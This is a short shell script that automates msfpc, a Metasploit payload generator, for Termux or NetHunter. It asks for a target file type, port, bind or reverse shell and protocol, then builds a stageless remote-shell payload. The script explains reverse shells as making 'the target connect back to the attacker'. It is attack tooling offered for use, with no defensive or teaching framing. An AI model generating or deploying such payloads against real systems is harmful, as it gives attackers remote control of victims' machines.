#!/bin/sh
# script by D3D_M4N
# automater for msfpc/metasploit
# this was designed for a termux/nethunter machine with the following packages
#	git	msfpc	metasploit-framework
echo "enter your filetype"
echo " APK ASP ASPX BASH JAVA LINUX OSX PERL";
echo " PHP POWERSHELL PYTHON TOMCAT WINDOWS ";
echo " type answer in lowercase";
read filetype
clear
echo "enter port";
read port
clear
echo "bind or reverse shell?";
echo "reverse - makes the target connect back to the attacker";
echo "bind - opens a port on the target side, and the attacker connects to them";
read shell
clear
echo "protocol";
echo "tcp http https";
read prot
clear
msfpc $filetype $port msf $shell stageless verbose

